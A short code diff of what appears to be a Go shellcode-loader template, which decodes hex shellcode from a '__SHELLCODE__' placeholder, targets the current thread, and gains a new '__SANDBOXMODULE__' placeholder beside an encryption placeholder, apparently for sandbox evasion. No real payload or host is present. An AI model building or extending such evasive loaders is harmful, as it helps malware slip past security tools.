@@ -9,11 +9,12 @@ import (
 	"syscall"
 	"unsafe"
 	//__ENCRYPTMODULE__
+	//__SANDBOXMODULE__
 )
 
 func main() {
 
-	// shellcode, _ := hex.DecodeString(code)
+	//__SANDBOX__
 	shellcode, _ := hex.DecodeString("__SHELLCODE__")
 	//__ENCRYPTCODE__
 	var thisThread = uintptr(0xffffffffffffffff)
